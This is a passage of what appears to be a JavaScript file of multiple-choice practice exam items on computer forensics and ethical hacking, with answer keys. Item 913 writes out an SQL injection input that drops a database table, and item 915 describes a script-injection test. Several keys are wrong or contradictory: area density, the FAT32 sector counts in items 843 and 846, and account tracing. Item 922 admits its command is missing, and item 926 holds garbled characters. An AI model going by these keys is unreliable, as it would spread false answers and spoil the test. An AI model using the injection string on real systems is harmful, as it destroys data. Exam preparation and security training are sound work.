      "You are working for a local police department that services a population of 1,000,000 people and you have been given the task of building a computer forensics lab. How many law-enforcement computer investigators should you request to staff the lab?",
    options: ["A. 8", "B. 1", "C. 4", "D. 2"],
    correctAnswer: 2,
  },
  {
    id: 825,
    question: "When obtaining a warrant it is important to:",
    options: [
      "A. particularly describe the place to be searched and particularly describe the items to be seized",
      "B. generally describe the place to be searched and particularly describe the items to be seized",
      "C. generally describe the place to be searched and generally describe the items to be seized",
      "D. particularly describe the place to be searched and generally describe the items to be seized",
    ],
    correctAnswer: 0,
  },
  {
    id: 828,
    question: "Sectors in hard disks typically contain how many bytes?",
    options: ["A. 256", "B. 512", "C. 1024", "D. 2048"],
    correctAnswer: 1,
  },
  {
    id: 829,
    question: "Area density refers to:",
    options: [
      "A. the amount of data per disk",
      "B. the amount of data per partition",
      "C. the amount of data per square inch",
      "D. the amount of data per platter",
    ],
    correctAnswer: 0,
  },
  {
    id: 830,
    question:
      "Corporate investigations are typically easier than public investigations because:",
    options: [
      "A. the users have standard corporate equipment and software",
      "B. the investigator does not have to get a warrant",
      "C. the investigator has to get a warrant",
      "D. the users can load whatever they want on their machines",
    ],
    correctAnswer: 1,
  },
  {
    id: 831,
    question:
      "Which of the following should a computer forensics lab used for investigations have?",
    options: [
      "A. isolation",
      "B. restricted access",
      "C. open access",
      "D. an entry log",
    ],
    correctAnswer: 1,
  },
  {
    id: 832,
    question:
      "Jason is the security administrator of ACMA metal Corporation. One day he notices the company's Oracle database server has been compromised and the customer information along with financial data has been stolen. The financial loss will be in millions of dollars if the database gets into the hands of the competitors. Jason wants to report this crime to the law enforcement agencies immediately. Which organization coordinates computer crimes investigations throughout the United States?",
    options: [
      "A. Internet Fraud Complaint Center",
      "B. Local or national office of the U.S. Secret Service",
      "C. National Infrastructure Protection Center",
      "D. CERT Coordination Center",
    ],
    correctAnswer: 1,
  },
  {
    id: 833,
    question:
      "Which Intrusion Detection System (IDS) usually produces the most false alarms due to the unpredictable behaviors of users and networks?",
    options: [
      "A. network-based IDS systems (NIDS)",
      "B. host-based IDS systems (HIDS)",
      "C. anomaly detection",
      "D. signature recognition",
    ],
    correctAnswer: 2,
  },
  {
    id: 835,
    question:
      "Why should you note all cable connections for a computer you want to seize as evidence?",
    options: [
      "A. to know what outside connections existed",
      "B. in case other devices were connected",
      "C. to know what peripheral devices exist",
      "D. to know what hardware existed",
    ],
    correctAnswer: 0,
  },
  {
    id: 837,
    question:
      "What method of computer forensics will allow you to trace all ever-established user accounts on a Windows 2000 server over the course of its lifetime?",
    options: [
      "A. forensic duplication of hard drive",
      "B. analysis of volatile data",
      "C. comparison of MD5 checksums",
      "D. review of SIDs in the Registry",
    ],
    correctAnswer: 2,
  },
  {
    id: 838,
    question: "Which response organization tracks hoaxes as well as viruses?",
    options: ["A. NIPC", "B. FEDCIRC", "C. CERT", "D. CIAC"],
    correctAnswer: 3,
  },
  {
    id: 839,
    question:
      "Which federal computer crime law specifically refers to fraud and related activity in connection with access devices like routers?",
    options: [
      "A. 18 U.S.C. 1029",
      "B. 18 U.S.C. 1362",
      "C. 18 U.S.C. 2511",
      "D. 18 U.S.C. 2703",
    ],
    correctAnswer: 0,
  },
  {
    id: 840,
    question:
      "Office documents (Word, Excel, PowerPoint) contain a code that allows tracking the MAC, or unique identifier, of the machine that created the document. What is that code called?",
    options: [
      "A. the Microsoft Virtual Machine Identifier",
      "B. the Personal Application Protocol",
      "C. the Globally Unique ID",
      "D. the Individual ASCII String",
    ],
    correctAnswer: 2,
  },
  {
    id: 841,
    question: "What TCP/UDP port does the toolkit program netstat use?",
    options: ["A. Port 7", "B. Port 15", "C. Port 23", "D. Port 69"],
    correctAnswer: 1,
  },
  {
    id: 843,
    question: "In a FAT32 system, a 123 KB file will use how many sectors?",
    options: ["A. 34", "B. 25", "C. 11", "D. 56"],
    correctAnswer: 1,
  },
  {
    id: 845,
    question:
      "When performing a forensics analysis, what device is used to prevent the system from recording data on an evidence disk?",
    options: [
      "A. a write-blocker",
      "B. a protocol analyzer",
      "C. a firewall",
      "D. a disk editor",
    ],
    correctAnswer: 0,
  },
  {
    id: 846,
    question: "How many sectors will a 125 KB file use in a FAT32 file system?",
    options: ["A. 32", "B. 16", "C. 256", "D. 25"],
    correctAnswer: 2,
  },
  {
    id: 847,
    question:
      "You are called by an author who is writing a book and he wants to know how long the copyright for his book will last after he has the book published?",
    options: [
      "A. 70 years",
      "B. the life of the author",
      "C. the life of the author plus 70 years",
      "D. copyrights last forever",
    ],
    correctAnswer: 2,
  },
  {
    id: 848,
    question:
      "When investigating a network that uses DHCP to assign IP addresses, where would you look to determine which system (MAC address) had a specific IP address at a specific time?",
    options: [
      "A. on the individual computer's ARP cache",
      "B. in the Web Server log files",
      "C. in the DHCP Server log files",
      "D. there is no way to determine the specific IP address",
    ],
    correctAnswer: 2,
  },
  {
    id: 849,
    question:
      "Bob was caught using a remote production system illegally. The organization had used a Virtual Environment to trap Bob. What is a Virtual Environment?",
    options: [
      "A. A Honeypot that traps hackers",
      "B. A system Using Trojaned commands",
      "C. An environment set up after the user logs in",
      "D. An environment set up before an user logs in",
    ],
    correctAnswer: 0,
  },
  {
    id: 850,
    question:
      "To make sure the evidence you recover and analyze with computer forensics software can be admitted in court, you must test and validate the software. What group is actively providing tools and creating procedures for testing and validating computer forensics software?",
    options: [
      "A. Computer Forensics Tools and Validation Committee (CFTVC)",
      "B. Association of Computer Forensics Software Manufactures (ACFSM)",
      "C. National Institute of Standards and Technology (NIST)",
      "D. Society for Valid Forensics Tools and Testing (SVFTT)",
    ],
    correctAnswer: 2,
  },
  {
    id: 851,
    question:
      "With regard to using an Antivirus scanner during a computer forensics investigation, you should:",
    options: [
      "A. Scan the suspect hard drive before beginning an investigation",
      "B. Never run a scan on your forensics workstation because it could change your systems configuration",
      "C. Scan your forensics workstation at intervals of no more than once every five minutes during an investigation",
      "D. Scan your Forensics workstation before beginning an investigation",
    ],
    correctAnswer: 3,
  },
  {
    id: 853,
    question:
      "You have used a newly released forensic investigation tool, which doesn't meet the Daubert Test, during a case. The case has ended-up in court. What argument could the defense make to weaken your case?",
    options: [
      "A. The tool hasn't been tested by the International Standards Organization (ISO)",
      "B. Only the local law enforcement should use the tool",
      "C. The tool has not been reviewed and accepted by your peers",
      "D. You are not certified for using the tool",
    ],
    correctAnswer: 2,
  },
  {
    id: 854,
    question: "Which of the following is NOT a graphics file?",
    options: [
      "A. Picture1.tga",
      "B. Picture2.bmp",
      "C. Picture3.nfo",
      "D. Picture4.psd",
    ],
    correctAnswer: 2,
  },
  {
    id: 855,
    question:
      "When conducting computer forensic analysis, you must guard against ______________ so that you remain focused on the primary job and ensure that the level of work does not increase beyond what was originally expected.",
    options: [
      "A. Hard Drive Failure",
      "B. Scope Creep",
      "C. Unauthorized expenses",
      "D. Overzealous marketing",
    ],
    correctAnswer: 1,
  },
  {
    id: 856,
    question:
      "In general, __________________ involves the investigation of data that can be retrieved from the hard disk or other disks of a computer by applying scientific methods to retrieve the data.",
    options: [
      "A. Network Forensics",
      "B. Data Recovery",
      "C. Disaster Recovery",
      "D. Computer Forensics",
    ],
    correctAnswer: 3,
  },
  {
    id: 857,
    question:
      "When you carve an image, recovering the image depends on which of the following skills?",
    options: [
      "A. Recognizing the pattern of the header content",
      "B. Recovering the image from a tape backup",
      "C. Recognizing the pattern of a corrupt file",
      "D. Recovering the image from the tape backup",
    ],
    correctAnswer: 0,
  },
  {
    id: 858,
    question:
      "When a file is deleted by Windows Explorer or through the MS-DOS delete command, the operating system inserts _______________ in the first letter position of the filename in the FAT database.",
    options: [
      "A. A Capital X",
      "B. A Blank Space",
      "C. The Underscore Symbol",
      "D. The lowercase Greek Letter Sigma (s)",
    ],
    correctAnswer: 3,
  },
  {
    id: 859,
    question:
      "While working for a prosecutor, what do you think you should do if the evidence you found appears to be exculpatory and is not being released to the defense?",
    options: [
      "A. Keep the information on file for later review",
      "B. Destroy the evidence",
      "C. Bring the information to the attention of the prosecutor, his or her supervisor or finally to the judge",
      "D. Present the evidence to the defense attorney",
    ],
    correctAnswer: 2,
  },
  {
    id: 861,
    question:
      "What type of file is represented by a colon (:) with a name following it in the Master File Table of an NTFS disk?",
    options: [
      "A. A compressed file",
      "B. A Data stream file",
      "C. An encrypted file",
      "D. A reserved file",
    ],
    correctAnswer: 1,
  },
  {
    id: 862,
    question:
      "An employee is suspected of stealing proprietary information stored on a computer using NTFS Encrypted File System (EFS). If the files were copied to a floppy disk, can the encryption be broken to verify possession?",
    options: [
      "A. EFS uses a 128-bit key that can't be cracked, so you will not be able to recover the information",
      "B. When the encrypted file was copied to the floppy disk, it was automatically unencrypted, so you can recover the information",
      "C. The EFS Revoked Key Agent can be used on the Computer to recover the information",
      "D. When the encrypted file was copied to the floppy disk, the EFS private key was also copied, so you can recover the information",
    ],
    correctAnswer: 1,
  },
  {
    id: 863,
    question:
      "When examining a hard disk without a write-blocker, you should not start Windows because Windows will write data to the:",
    options: ["A. Recycle Bin", "B. MSDOS.sys", "C. BIOS", "D. Case files"],
    correctAnswer: 0,
  },
  {
    id: 864,
    question:
      "You are called in to assist the police in a case involving a password-protected floppy disk. What are two common methods used by password cracking software to obtain the password?",
    options: [
      "A. Limited force and library attack",
      "B. Brut Force and dictionary Attack",
      "C. Maximum force and thesaurus Attack",
      "D. Minimum force and appendix Attack",
    ],
    correctAnswer: 1,
  },
  {
    id: 865,
    question:
      "When reviewing web logs, you see an entry for 'resource not found' in the HTTP status code field. What is the actual error code you would see?",
    options: ["A. 202", "B. 404", "C. 505", "D. 909"],
    correctAnswer: 1,
  },
  {
    id: 866,
    question:
      "Volatile memory is a challenge for forensic analysis because data may disappear on shutdown. In a lab, which option is most appropriate to help capture this data?",
    options: [
      "A. Use VMware to be able to capture the data in memory and examine it",
      "B. Give the Operating System a minimal amount of memory, forcing it to use a swap file",
      "C. Create a separate partition of several hundred megabytes and place the swap file there",
      "D. Use intrusion forensic techniques to study memory resident infections",
    ],
    correctAnswer: 2,
  },
  {
    id: 867,
    question:
      "What port do you send a fake email to on the company SMTP server?",
    options: ["A. 10", "B. 25", "C. 110", "D. 135"],
    correctAnswer: 1,
  },
  {
    id: 868,
    question:
      "This is the original file structure database that Microsoft designed for floppy disks. It is written to the outermost track of a disk and contains information about each file stored on the drive.",
    options: [
      "A. Master Boot Record (MBR)",
      "B. Master File Table (MFT)",
      "C. File Allocation Table (FAT)",
      "D. Disk Operating System (DOS)",
    ],
    correctAnswer: 2,
  },
  {
    id: 869,
    question:
      "What should you do when approached by a reporter about a case you are working on or have worked on?",
    options: [
      "A. Refer the reporter to the attorney that retained you",
      'B. Say, "no comment"',
      "C. Answer all the reporter's questions as completely as possible",
      "D. Answer only the questions that help your case",
    ],
    correctAnswer: 0,
  },
  {
    id: 871,
    question:
      "Where did the incident response team go wrong in the case of the erased servers and zip disk?",
    options: [
      "A. They examined the actual evidence on an unrelated system",
      "B. They attempted to implicate personnel without proof",
      "C. They tampered with evidence by using it",
      "D. They called in the FBI without correlating with the fingerprint data",
    ],
    correctAnswer: 2,
  },
  {
    id: 872,
    question:
      "Why is it important to view the contents of the page or swap file when investigating a Windows System?",
    options: [
      "A. Windows stores all of the system's configuration information in this file",
      "B. This is the file that Windows uses to communicate directly with the Registry",
      "C. A large volume of data can exist within the swap file of which the computer user has no knowledge",
      "D. This is the file that Windows uses to store the history of the last 100 commands run from the command line",
    ],
    correctAnswer: 2,
  },
  {
    id: 873,
    question:
      "What is the correct sequence of events after securing the scene and shutting down the system during a hacking incident investigation?",
    options: [
      "A. Connect the target media; prepare the system for acquisition; Secure the evidence; Copy the media",
      "B. Prepare the system for acquisition; Connect the target media; Copy the media; Secure the evidence",
      "C. Connect the target media; Prepare the system for acquisition; Secure the evidence; Copy the media",
      "D. Secure the evidence; Prepare the system for acquisition; Connect the target media; Copy the media",
    ],
    correctAnswer: 1,
  },
  {
    id: 874,
    question:
      "What does the use of warning banners help a company avoid by overcoming an employee’s assumed right?",
    options: [
      "A. Right to work",
      "B. Right of free speech",
      "C. Right to Internet Access",
      "D. Right of Privacy",
    ],
    correctAnswer: 3,
  },
  {
    id: 875,
    question: "What does mactime, a part of the Coroner’s Toolkit, do?",
    options: [
      "A. It traverses the file system and produces a listing of all files based on the modification, access and change timestamps",
      "B. It can recover deleted file space and search it for data, but does not allow preview",
      "C. The tool scans for i-node information, which is used by other tools in the toolkit",
      "D. It is a tool specific to the MAC OS and forms a core component of the toolkit",
    ],
    correctAnswer: 0,
  },
  {
    id: 876,
    question:
      "One way to identify the presence of hidden partitions on a suspect's hard drive is to:",
    options: [
      "A. Add up the total size of all known partitions and compare it to the total size of the hard drive",
      "B. Examine the FAT and identify hidden partitions by noting an H in the partition Type field",
      "C. Examine the LILO and note an H in the partition Type field",
      "D. It is not possible to have hidden partitions on a hard drive",
    ],
    correctAnswer: 0,
  },
  {
    id: 877,
    question:
      "What information do you need to recover when searching a victim's computer for a crime committed with a specific email message?",
    options: [
      "A. Internet service provider information",
      "B. E-mail header",
      "C. Username and password",
      "D. Firewall log",
    ],
    correctAnswer: 1,
  },
  {
    id: 878,
    question:
      "What would be the primary reason to recommend a disk imaging tool instead of a simple DOS copy of files?",
    options: [
      "A. A disk imaging tool would check for CRC32s for internal self-checking and validation and have MD5 checksum",
      "B. Evidence file format will contain case data entered by the examiner and encrypted at the beginning of the evidence file",
      "C. A simple DOS copy will not include deleted files, file slack, and other information",
      "D. There is no case for an imaging tool as it will use a closed, proprietary format that if compared to the original will not match up sector for sector",
    ],
    correctAnswer: 2,
  },
  {
    id: 879,
    question:
      "What prevents you from discussing a case with the CEO when employed directly by an attorney?",
    options: [
      "A. The attorney-work-product rule",
      "B. Good manners",
      "C. Trade secrets",
      "D. ISO 17799",
    ],
    correctAnswer: 0,
  },
  {
    id: 880,
    question:
      "What can an investigator examine to verify that a file has the correct extension?",
    options: [
      "A. The File Allocation Table",
      "B. The file header",
      "C. The file footer",
      "D. The sector map",
    ],
    correctAnswer: 1,
  },
  {
    id: 881,
    question:
      "Which organization maintains a database of hash signatures for known software?",
    options: [
      "A. International Standards Organization",
      "B. Institute of Electrical and Electronics Engineers",
      "C. National Software Reference Library",
      "D. American National Standards Institute",
    ],
    correctAnswer: 2,
  },
  {
    id: 882,
    question:
      "The ____________________ refers to handing over the results of private investigations to the authorities because of indications of criminal activity.",
    options: [
      "A. Locard Exchange Principle",
      "B. Clark Standard",
      "C. Kelly Policy",
      "D. Silver-Platter Doctrine",
    ],
    correctAnswer: 3,
  },
  {
    id: 883,
    question:
      "What should you do if an employer has no policy reserving the right to inspect computing assets?",
    options: [
      "A. Inform the owner that conducting an investigation without a policy is not a problem because the company is privately owned",
      "B. Inform the owner that conducting an investigation without a policy is a violation of the 4th amendment",
      "C. Inform the owner that conducting an investigation without a policy is a violation of the employee's expectation of privacy",
      "D. Inform the owner that conducting an investigation without a policy is not a problem because a policy is only necessary for government agencies",
    ],
    correctAnswer: 2,
  },
  {
    id: 884,
    question:
      "Can an employer file a criminal complaint with police if a corporate investigation reveals an employee is committing a crime?",
    options: [
      "A. Yes, and all evidence can be turned over to the police",
      "B. Yes, but only if you turn the evidence over to a federal law enforcement agency",
      "C. No, because the investigation was conducted without following standard police procedures",
      "D. No, because the investigation was conducted without warrant",
    ],
    correctAnswer: 0,
  },
  {
    id: 885,
    question:
      "____________________ is simply the application of Computer Investigation and analysis techniques in the interests of determining potential legal evidence.",
    options: [
      "A. Network Forensics",
      "B. Computer Forensics",
      "C. Incident Response",
      "D. Event Reaction",
    ],
    correctAnswer: 1,
  },
  {
    id: 886,
    question:
      "What is the name of the standard Linux command, also available as a Windows application, that can be used to create bit-stream images?",
    options: ["A. mcopy", "B. image", "C. MD5", "D. dd"],
    correctAnswer: 3,
  },
  {
    id: 887,
    question:
      "To preserve digital evidence, an investigator should ____________________",
    options: [
      "A. Make two copies of each evidence item using a single imaging tool",
      "B. Make a single copy of each evidence item using an approved imaging tool",
      "C. Make two copies of each evidence item using different imaging tools",
      "D. Only store the original evidence item",
    ],
    correctAnswer: 2,
  },
  {
    id: 888,
    question:
      "Profiling is a forensics technique for analyzing evidence with the goal of identifying the perpetrator from their various activity. After a computer has been compromised by a hacker, which of the following would be most important in forming a profile of the incident?",
    options: [
      "A. The manufacturer of the system compromised",
      "B. The logic, formatting and elegance of the code used in the attack",
      "C. The nature of the attack",
      "D. The vulnerability exploited in the incident",
    ],
    correctAnswer: 1,
  },
  {
    id: 890,
    question: "An expert witness may give an opinion if:",
    options: [
      "A. The opinion, inferences or conclusions depend on special knowledge, skill or training not within the ordinary experience of lay jurors",
      "B. To define the issues of the case for determination by the finder of fact",
      "C. To stimulate discussion between the consulting expert and the expert witness",
      "D. To deter the witness from expanding the scope of his or her investigation beyond the requirements of the case",
    ],
    correctAnswer: 0,
  },
  {
    id: 891,
    question:
      "When using Windows acquisition tools to acquire digital evidence, it is important to use a well-tested hardware write-blocking device to:",
    options: [
      "A. Automate collection from image files",
      "B. Avoid copying data from the boot partition",
      "C. Acquire data from host-protected area on a disk",
      "D. Prevent contamination to the evidence drive",
    ],
    correctAnswer: 3,
  },
  {
    id: 892,
    question:
      "Office Documents (Word, Excel and PowerPoint) contain a code that allows tracking the MAC or unique identifier of the machine that created the document. What is that code called?",
    options: [
      "A. Globally unique ID",
      "B. Microsoft Virtual Machine Identifier",
      "C. Personal Application Protocol",
      "D. Individual ASCII string",
    ],
    correctAnswer: 0,
  },
  {
    id: 894,
    question:
      "You have been asked to investigate after a user has reported a threatening e-mail they have received from an external source. Which of the following are you most interested in when trying to trace the source of the message?",
    options: [
      "A. The X509 Address",
      "B. The SMTP reply Address",
      "C. The E-mail Header",
      "D. The Host Domain Name",
    ],
    correctAnswer: 2,
  },
  {
    id: 895,
    question:
      "You discover evidence that a subject is embezzling money from the company. The law enforcement officer requests that you put a network sniffer on the subject's computer. Why do you refuse?",
    options: [
      "A. Violate your contract",
      "B. Cause network congestion",
      "C. Make you an agent of law enforcement",
      "D. Write information to the subject's hard drive",
    ],
    correctAnswer: 2,
  },
  {
    id: 896,
    question:
      "A law enforcement officer may only search for and seize criminal evidence with _______________________, which are facts or circumstances that would lead a reasonable person to believe a crime has been committed or is about to be committed, and evidence of the specific crime exists at the place to be searched.",
    options: [
      "A. Mere Suspicion",
      "B. A preponderance of the evidence",
      "C. Probable cause",
      "D. Beyond a reasonable doubt",
    ],
    correctAnswer: 2,
  },
  {
    id: 897,
    question:
      "The police believe that Mevin Mattew has been obtaining unauthorized access to computers belonging to several companies. What is preventing the police from breaking down the suspect’s door and searching his home and seizing all his computer equipment if they have not yet obtained a warrant?",
    options: [
      "A. The Fourth Amendment",
      "B. The USA Patriot Act",
      "C. The Good Samaritan Laws",
      "D. The Federal Rules of Evidence",
    ],
    correctAnswer: 0,
  },
  {
    id: 898,
    question: "When cataloging digital evidence, the primary goal is to",
    options: [
      "A. Make bit-stream images of all hard drives",
      "B. Preserve evidence integrity",
      "C. Not remove the evidence from the scene",
      "D. Not allow the computer to be turned off",
    ],
    correctAnswer: 1,
  },
  {
    id: 899,
    question:
      "You are conducting an investigation involving complex text searches. Which tool allows you to efficiently search for a string within a file on the bitmap image of the target computer?",
    options: ["A. Stringsearch", "B. grep", "C. dir", "D. vim"],
    correctAnswer: 1,
  },
  {
    id: 901,
    question:
      "You become aware that a suspect is using ABC Company as their ISP. What assistance can the ISP provide?",
    options: [
      "A. The ISP can investigate anyone using their service and can provide you with assistance",
      "B. The ISP can investigate computer abuse committed by their employees, but must preserve the privacy of their customers and therefore cannot assist you without a warrant",
      "C. The ISP can't conduct any type of investigations on anyone and therefore can't assist you",
      "D. ISPs never maintain log files so they would be of no use to your investigation",
    ],
    correctAnswer: 1,
  },
  {
    id: 902,
    question:
      "A company’s web address leads to a pornographic site when typed in a browser, but the IP address works normally. What type of attack has likely occurred?",
    options: [
      "A. ARP Poisoning",
      "B. DNS Poisoning",
      "C. HTTP redirect attack",
      "D. IP Spoofing",
    ],
    correctAnswer: 1,
  },
  {
    id: 903,
    question:
      "A school systems administrator gives you a simple backup copy of a student’s hard drive and requests you investigate for inappropriate images. What type of copy should you request to ensure completeness and admissibility of evidence?",
    options: [
      "A. Bit-stream Copy",
      "B. Robust Copy",
      "C. Full backup Copy",
      "D. Incremental Backup Copy",
    ],
    correctAnswer: 0,
  },
  {
    id: 904,
    question:
      "Law enforcement officers legally search a location and observe unrelated evidence in plain view. What doctrine allows this evidence to be admissible?",
    options: [
      "A. Plain view doctrine",
      "B. Corpus delicti",
      "C. Locard Exchange Principle",
      "D. Ex Parte Order",
    ],
    correctAnswer: 0,
  },
  {
    id: 905,
    question:
      "Microsoft Outlook maintains email messages in a proprietary format in what type of file?",
    options: ["A. .email", "B. .mail", "C. .pst", "D. .doc"],
    correctAnswer: 2,
  },
  {
    id: 906,
    question:
      "The efforts to obtain information before a trial by demanding documents, depositions, interrogatories, and examination of the scene is a description of what legal term?",
    options: ["A. Detection", "B. Hearsay", "C. Spoliation", "D. Discovery"],
    correctAnswer: 3,
  },
  {
    id: 907,
    question:
      "The rule of thumb when shutting down a system is to pull the power plug. However, what is a major drawback of this approach?",
    options: [
      "A. Any data not yet flushed to the system will be lost",
      "B. All running processes will be lost",
      "C. The /tmp directory will be flushed",
      "D. Power interruption will corrupt the pagefile",
    ],
    correctAnswer: 0,
  },
  {
    id: 908,
    question:
      "You are assisting in an investigation of threatening emails. The complainant gives you printed copies of 27 emails. You inform her that you need access to the __________ to track the emails back to the suspect.",
    options: [
      "A. Routing Table",
      "B. Firewall log",
      "C. Configuration files",
      "D. Email Header",
    ],
    correctAnswer: 3,
  },
  {
    id: 909,
    question:
      "Hackers can manipulate Windows Registry for various purposes. Which Registry Hive can be used to load an application at startup?",
    options: [
      "A. HKEY_LOCAL_MACHINE\\hardware\\windows\\start",
      "B. HKEY_LOCAL_USERS\\Software|Microsoft\\old\\Version\\Load",
      "C. HKEY_CURRENT_USER\\Microsoft\\Default",
      "D. HKEY_LOCAL_MACHINE\\Software\\Microsoft\\CurrentVersion\\Run",
    ],
    correctAnswer: 3,
  },
  {
    id: 910,
    question: "Which of the following file systems is used by Mac OS X?",
    options: ["A. EFS", "B. HFS+", "C. EXT2", "D. NFS"],
    correctAnswer: 1,
  },
  {
    id: 911,
    question:
      "When running a vulnerability scan on a network and the IDS cuts off your connection, what type of IDS is being used?",
    options: [
      "A. Passive IDS",
      "B. Active IDS",
      "C. Progressive IDS",
      "D. NIPS",
    ],
    correctAnswer: 1,
  },
  {
    id: 912,
    question:
      "Simon, a former employee, tries to run axfr and ixfr commands using DIG. What is he attempting to do?",
    options: [
      "A. Send DOS commands to crash the DNS servers",
      "B. Perform DNS poisoning",
      "C. Perform a zone transfer",
      "D. Enumerate all the users in the domain",
    ],
    correctAnswer: 2,
  },
  {
    id: 913,
    question:
      "What will the following SQL command produce on a website login page? SELECT email, passwd, login_id, full_name FROM members WHERE email = 'someone@somewhere.com'; DROP TABLE members; --",
    options: [
      "A. Deletes the entire members table",
      "B. Inserts the email address into the members table",
      "C. Retrieves the password for the first user in the members table",
      "D. This command will not produce anything since the syntax is incorrect",
    ],
    correctAnswer: 0,
  },
  {
    id: 914,
    question:
      "You suspect firewall issues are preventing SNMP communication with remote offices. Which ports should be opened? (Select 2)",
    options: ["A. 162", "B. 161", "C. 163", "D. 160"],
    correctAnswer: [0, 1],
  },
  {
    id: 915,
    question:
      "You test a dynamic web page by inputting JavaScript into a search field and receive a pop-up saying: 'This is a test.' What does this indicate?",
    options: [
      "A. Your website is vulnerable to CSS",
      "B. Your website is not vulnerable",
      "C. Your website is vulnerable to SQL injection",
      "D. Your website is vulnerable to web bugs",
    ],
    correctAnswer: 0,
  },
  {
    id: 916,
    question:
      "In IDLE scanning, if an attacker’s computer sends an IPID of 31400 to a zombie computer on an open port, what will be the response?",
    options: [
      "A. The zombie will not send a response",
      "B. 31402",
      "C. 31399",
      "D. 31401",
    ],
    correctAnswer: 3,
  },
  {
    id: 917,
    question:
      "Michael conducts an XMAS scan using Nmap and most of the ports do not respond. In what state are these ports?",
    options: ["A. Closed", "B. Open", "C. Stealth", "D. Filtered"],
    correctAnswer: 1,
  },
  {
    id: 918,
    question:
      "To comply with DoD policy, which requires allowing only incoming connections initiated internally, which type of firewall should be implemented?",
    options: [
      "A. Packet filtering firewall",
      "B. Circuit-level proxy firewall",
      "C. Application-level proxy firewall",
      "D. Statefull firewall",
    ],
    correctAnswer: 3,
  },
  {
    id: 919,
    question:
      "Jessica wants to scan her network for live hosts using ICMP ECHO Requests. What type of scan is this?",
    options: [
      "A. Tracert",
      "B. Smurf scan",
      "C. Ping trace",
      "D. ICMP ping sweep",
    ],
    correctAnswer: 3,
  },
  {
    id: 920,
    question:
      "You are passively footprinting a law firm's web servers. Which tool would you use?",
    options: ["A. Ping sweep", "B. Nmap", "C. Netcraft", "D. Dig"],
    correctAnswer: 2,
  },
  {
    id: 921,
    question:
      "After accessing a Cisco router's config file via a URL, what vulnerability have you discovered? http://172.168.4.131/level/99/exec/show/config",
    options: [
      "A. HTTP Configuration Arbitrary Administrative Access Vulnerability",
      "B. HTML Configuration Arbitrary Administrative Access Vulnerability",
      "C. Cisco IOS Arbitrary Administrative Access Online Vulnerability",
      "D. URL Obfuscation Arbitrary Administrative Access Vulnerability",
    ],
    correctAnswer: 0,
  },
  {
    id: 922,
    question:
      "What is the command trying to verify? (Note: The actual command is missing but based on context)",
    options: [
      "A. Verify that UDP port 445 is open for the 192.168.0.0 network",
      "B. Verify that TCP port 445 is open for the 192.168.0.0 network",
      "C. Verify that NETBIOS is running for the 192.168.0.0 network",
      "D. Verify that UDP port 445 is closed for the 192.168.0.0 network",
    ],
    correctAnswer: 0,
  },
  {
    id: 923,
    question:
      "Why were 14-character passwords cracked so quickly after a Group Policy change?",
    options: [
      "A. Passwords of 14 characters or less are broken up into two 7-character hashes",
      "B. A password Group Policy change takes at least 3 weeks to completely replicate throughout a network",
      "C. Networks using Active Directory never use SAM databases so the SAM database pulled was empty",
      "D. The passwords that were cracked are local accounts on the Domain Controller",
    ],
    correctAnswer: 0,
  },
  {
    id: 924,
    question: "An 'idle' system is also referred to as what?",
    options: [
      "A. PC not connected to the Internet",
      "B. Zombie",
      "C. PC not being used",
      "D. Bot",
    ],
    correctAnswer: 1,
  },
  {
    id: 925,
    question:
      "Larry plans to shut down a city's network using BGP devices and zombies. What type of penetration testing is he performing?",
    options: [
      "A. Router Penetration Testing",
      "B. DoS Penetration Testing",
      "C. Firewall Penetration Testing",
      "D. Internal Penetration Testing",
    ],
    correctAnswer: 1,
  },
  {
    id: 926,
    question:
      "What can you infer from receiving an error message window after typing a quotation mark (?) in the username field on a website?",
    options: [
      "A. SQL injection is possible",
      "B. SQL injection is not possible",
      "C. The quotation mark (?) is a valid username",
      "D. The user for line 3306 in the SQL database has a weak password",
    ],
    correctAnswer: 0,
  },
  {
    id: 927,
    question:
      "What information will John be able to gather from Hillary's computer by using Lophtcrack program and sending her an email with a malicious link?",
    options: [
      "A. Hillary network username and password hash",
      "B. The SID of Hillary network account",
      "C. The SAM file from Hillary's computer",
      "D. The network shares that Hillary has permissions",
    ],
    correctAnswer: 0,
  },
  {
    id: 928,
    question:
      "Why do PDF passwords not offer maximum protection when sending through email?",
    options: [
      "A. PDF passwords can easily be cracked by software brute force tools",
      "B. PDF passwords are converted to clear text when sent through E-mail",
      "C. PDF passwords are not considered safe by Sarbanes-Oxley",
      "D. When sent through E-mail, PDF passwords are stripped from the document completely",
    ],
    correctAnswer: 0,
  },
  {
    id: 929,
    question:
      "What could have prevented the theft of sensitive information from laptops that were stolen from Meyer Electronics Systems?",
    options: [
      "A. EFS Encryption",
      "B. DFS Encryption",
      "C. IPS Encryption",
      "D. SDW Encryption",
    ],
    correctAnswer: 0,
  },
  {
    id: 930,
    question:
      "What networking protocol language should Kimberly learn that routers utilize?",
    options: ["A. ATM", "B. UDP", "C. BPG", "D. OSPF"],
    correctAnswer: 3,
  },
  {
    id: 932,
    question:
      "What IDS feature must George implement to meet the requirement of a 'time-based induction machine' in the state bill?",
    options: [
      "A. Signature-based anomaly detection",
      "B. Pattern matching",
      "C. Real-time anomaly detection",
      "D. Statistical-based anomaly detection",
    ],
    correctAnswer: 2,
  },
  {
    id: 933,
    question:
      "Why does John not see any of the traffic produced by Firewalk after using a sniffer on a subnet inside his network?",
    options: [
      "A. Firewalk cannot pass through Cisco firewalls",
      "B. Firewalk sets all packets with a TTL of zero",
      "C. Firewalk cannot be detected by network sniffers",
      "D. Firewalk sets all packets with a TTL of one",
    ],
    correctAnswer: 3,
  },
  {
    id: 934,
    question:
      "What countermeasure should George take to prevent DDoS attacks on his network?",
    options: [
      "A. Enable direct broadcasts",
      "B. Disable direct broadcasts",
      "C. Disable BGP",
      "D. Enable BGP",
    ],
    correctAnswer: 1,
  },
  {
    id: 935,
    question: "Why is Nessus not recommended for a stealthy wireless scan?",
    options: [
      "A. Nessus is too loud",
      "B. Nessus cannot perform wireless testing",
      "C. Nessus is not a network scanner",
      "D. There are no ways of performing a 'stealthy' wireless scan",
    ],
    correctAnswer: 0,
  },
  {
    id: 936,
    question: "At what layer of the OSI model do routers function on?",
    options: ["A. 4", "B. 3", "C. 1", "D. 5"],
    correctAnswer: 1,
  },
  {
    id: 937,
    question:
      "What organization should Frank submit the log to find out if it is a new vulnerability or not?",
    options: ["A. APIPA", "B. IANA", "C. CVE", "D. RIPE"],
    correctAnswer: 2,
  },
  {
    id: 938,
    question:
      "What filter should George use in Ethereal to monitor only SFTP traffic to and from his network?",
    options: [
      "A. src port 23 and dst port 23",
      "B. udp port 22 and host 172.16.28.1/24",
      "C. net port 22",
